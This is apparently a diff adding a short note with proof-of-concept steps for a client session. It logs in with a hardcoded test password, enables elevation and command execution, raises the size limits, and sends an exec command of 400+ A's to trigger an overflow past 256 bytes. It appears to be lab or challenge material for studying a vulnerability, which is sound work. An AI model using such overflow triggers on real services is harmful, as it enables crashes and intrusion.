@@ -1,0 +1,14 @@
+python client.py session --user test --password SBLCHT42
+
+In session:
+
+handshake
+login
+set EleEnabled True
+elevate
+set maxPayload 600
+set EnCmdExec True
+set CmdSize 600
+
+Trigger the vuln with a command longer than 256 bytes:
+exec AAAAAAAAAA...(400+ A's)
